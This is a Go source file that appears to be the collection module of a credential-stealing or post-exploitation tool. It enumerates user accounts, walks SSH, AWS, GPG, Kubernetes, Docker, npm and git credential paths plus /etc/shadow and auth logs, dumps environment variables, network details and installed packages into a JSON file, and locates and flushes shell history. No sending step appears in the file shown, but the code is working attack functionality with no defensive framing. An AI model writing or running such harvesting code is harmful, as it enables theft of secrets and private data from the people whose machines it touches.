package internal

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

func EnumerateUsers() ([]string, error) {
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return nil, fmt.Errorf("failed to read /etc/passwd: %v", err)
	}

	var homeDirs []string
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		if len(fields) > 5 {
			// Get UID and filter non-user accounts
			uid, err := strconv.Atoi(fields[2])
			if err != nil || uid < 1000 {
				continue // Ignore system accounts (UID < 1000)
			}

			homeDir := fields[5]
			if homeDir != "" && canAccessFile(homeDir) {
				// Validate that the home directory exists and is accessible
				info, err := os.Stat(homeDir)
				if err == nil && info.IsDir() {
					homeDirs = append(homeDirs, homeDir)
				}
			}
		}
	}

	return homeDirs, nil
}

// ScanSensitiveFiles collects all files from specified paths for all accessible users.
func ScanSensitiveFiles(outputDir string) ([]string, error) {
	// Get current user's home directory
	currentHome, _ := os.UserHomeDir()

	// Get home directories for all users
	userHomes, err := EnumerateUsers()
	if err != nil {
		fmt.Printf("Error enumerating users: %v\n", err)
		userHomes = []string{currentHome} // Fallback to current user's home
	}

	// Strategic paths for gathering sensitive data
	relativePaths := []string{
		".ssh", ".aws", ".gnupg", ".git-credentials", ".gitconfig", ".docker",
		".kube", ".config/gcloud", ".azure", ".openvpn", ".profile", ".npmrc",
		".pypirc", ".netrc", ".local/share/keyrings", "secrets", ".bashrc", ".zshrc",
	}

	// System-level paths
	systemPaths := []string{
		"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hostname", "/etc/hosts",
		"/etc/ssl", "/etc/crontab", "/etc/apache2", "/etc/httpd", "/etc/nginx/conf.d",
		"/var/spool/cron", "/var/spool/mail", "/var/log/auth.log", "/var/log/secure",
		"/var/log/messages", "/var/log/syslog", "/tmp/ssh-*", "/tmp/vim*",
	}

	var wg sync.WaitGroup
	fileChan := make(chan string)
	errChan := make(chan error)

	// Scan home directories
	for _, home := range userHomes {
		for _, relPath := range relativePaths {
			absPath := filepath.Join(home, relPath)
			wg.Add(1)
			go func(path string) {
				defer wg.Done()
				files := expandPath(path)
				for _, file := range files {
					if _, err := os.Stat(file); err == nil {
						fileChan <- file
					} else {
						errChan <- fmt.Errorf("failed to access %s: %v", file, err)
					}
				}
			}(absPath)
		}
	}

	// Scan system paths
	for _, path := range systemPaths {
		wg.Add(1)
		go func(path string) {
			defer wg.Done()
			files := expandPath(path)
			for _, file := range files {
				if _, err := os.Stat(file); err == nil {
					fileChan <- file
				} else {
					errChan <- fmt.Errorf("failed to access %s: %v", file, err)
				}
			}
		}(path)
	}

	// Wait for all goroutines to complete
	go func() {
		wg.Wait()
		close(fileChan)
		close(errChan)
	}()

	// Collect results and handle errors
	var files []string
	for file := range fileChan {
		//fmt.Printf("Found file: %s\n", file) // Debug log
		files = append(files, file)
	}

	// Log errors but proceed
	for err := range errChan {
		fmt.Println(err)
	}

	// Save system info
	systemInfoPath, err := saveSystemInfo(outputDir)
	if err != nil {
		return nil, err
	}

	// Add system info to the files list
	files = append(files, systemInfoPath)

	return files, nil
}

// expandPath expands directories into a list of files.
func expandPath(path string) []string {
	var fileList []string

	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			// Log the error but continue
			//fmt.Printf("Error accessing %s: %v\n", p, err)
			return nil
		}
		if !info.IsDir() && canAccessFile(p) {
			fileList = append(fileList, p)
		}
		return nil
	})

	if err != nil {
		fmt.Printf("Error walking the path %s: %v\n", path, err)
	}

	return fileList
}

// saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
func saveSystemInfo(outputDir string) (string, error) {
	systemInfo, err := GetSystemInfo()
	if err != nil {
		return "", fmt.Errorf("failed to retrieve system info: %w", err)
	}

	// Convert system info to JSON
	data, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to serialize system info: %w", err)
	}

	// Create the output directory if it doesn't exist
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create output directory: %w", err)
	}

	// Write system info to a file
	filePath := filepath.Join(outputDir, "system_info.json")
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write system info to file: %w", err)
	}

	return filePath, nil
}

// GetSystemInfo retrieves environment variables, OS info, and IP addresses.
func GetSystemInfo() (map[string]interface{}, error) {
	info := make(map[string]interface{})

	// Get environment variables
	info["env_vars"] = os.Environ()

	// Get OS info
	info["os"] = map[string]string{
		"os":      runtime.GOOS,
		"arch":    runtime.GOARCH,
		"num_cpu": fmt.Sprintf("%d", runtime.NumCPU()),
	}

	// Get current user and hostname
	user, err := os.UserHomeDir()
	if err == nil {
		info["current_user"] = user
	} else {
		info["current_user"] = "N/A"
	}

	hostname, err := os.Hostname()
	if err == nil {
		info["hostname"] = hostname
	} else {
		info["hostname"] = "N/A"
	}

	// Get local IP addresses
	var localIPs []string
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ip, ok := addr.(*net.IPNet); ok && !ip.IP.IsLoopback() {
				if ip.IP.To4() != nil {
					localIPs = append(localIPs, ip.IP.String())
				}
			}
		}
	}
	info["local_ips"] = localIPs

	// Get public IP address
	publicIP, err := getPublicIP()
	if err == nil {
		info["public_ip"] = publicIP
	} else {
		info["public_ip"] = "N/A"
	}

	// Get system uptime
	uptime, err := getSystemUptime()
	if err == nil {
		info["uptime"] = uptime
	} else {
		info["uptime"] = "N/A"
	}

	// Get load averages (Linux-specific)
	loadAvg, err := getLoadAverage()
	if err == nil {
		info["load_avg"] = loadAvg
	} else {
		info["load_avg"] = "N/A"
	}

	// Get mounted file systems
	mountedFS, err := getMountedFileSystems()
	if err == nil {
		info["mounted_filesystems"] = mountedFS
	} else {
		info["mounted_filesystems"] = "N/A"
	}

	// Get active network connections
	connections, err := getActiveConnections()
	if err == nil {
		info["active_connections"] = connections
	} else {
		info["active_connections"] = "N/A"
	}

	// Get installed packages (Linux-specific)
	packages, err := getInstalledPackages()
	if err == nil {
		info["installed_packages"] = packages
	} else {
		info["installed_packages"] = "N/A"
	}

	return info, nil
}

// Helper functions

func getSystemUptime() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/uptime")
		if err != nil {
			return "", err
		}
		fields := strings.Fields(string(data))
		uptimeSeconds, err := strconv.ParseFloat(fields[0], 64)
		if err != nil {
			return "", err
		}
		uptime := time.Duration(uptimeSeconds) * time.Second
		return uptime.String(), nil
	}
	return "Unsupported OS for uptime", nil
}

func getLoadAverage() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/loadavg")
		if err != nil {
			return "", err
		}
		return string(data), nil
	}
	return "Unsupported OS for load average", nil
}

func getMountedFileSystems() ([]string, error) {
	var result []string
	file, err := os.Open("/proc/mounts")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) > 1 {
			result = append(result, fields[1]) // Append mount point
		}
	}

	return result, nil
}

func getActiveConnections() ([]string, error) {
	if runtime.GOOS == "linux" {
		out, err := exec.Command("ss", "-tulnp").Output()
		if err != nil {
			return nil, err
		}
		return strings.Split(string(out), "\n"), nil
	}
	return nil, fmt.Errorf("unsupported os for active connections")
}

func getInstalledPackages() ([]string, error) {
	var packages []string
	if runtime.GOOS == "linux" {
		cmds := [][]string{
			{"dpkg", "-l"},      // Debian-based systems
			{"rpm", "-qa"},      // Red Hat-based systems
			{"pacman", "-Q"},    // Arch-based systems
			{"apk", "info"},     // Alpine Linux
			{"flatpak", "list"}, // Flatpak
			{"snap", "list"},    // Snap
		}
		for _, cmd := range cmds {
			out, err := exec.Command(cmd[0], cmd[1:]...).Output()
			if err == nil {
				packages = append(packages, strings.Split(string(out), "\n")...)
			}
		}
		return packages, nil
	}
	return nil, fmt.Errorf("unsupported os for installed packages")
}

// getPublicIP fetches the public IP address of the system.
func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, err = buf.ReadFrom(resp.Body)
	if err != nil {
		return "", err
	}

	return buf.String(), nil
}

// DetectDefaultShell detects the default shell and returns the history file path.
func DetectDefaultShell() string {
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash" // Default fallback
	}

	switch filepath.Base(shell) {
	case "zsh":
		flushZshHistory()
		return filepath.Join(currentUser.HomeDir, ".zsh_history")
	case "bash":
		return filepath.Join(currentUser.HomeDir, ".bash_history")
	case "ash":
		return filepath.Join(currentUser.HomeDir, ".ash_history")
	case "ksh":
		return filepath.Join(currentUser.HomeDir, ".ksh_history")
	case "tcsh":
		return filepath.Join(currentUser.HomeDir, ".tcsh_history")
	default:
		return "" // Unsupported shell
	}
}

func flushZshHistory() {
	cmd := exec.Command("zsh", "-c", "fc -W")
	if err := cmd.Run(); err != nil {
		// Log the error or document why it is safe to ignore
		fmt.Println("Warning: Failed to flush Zsh history:", err)
	}
}
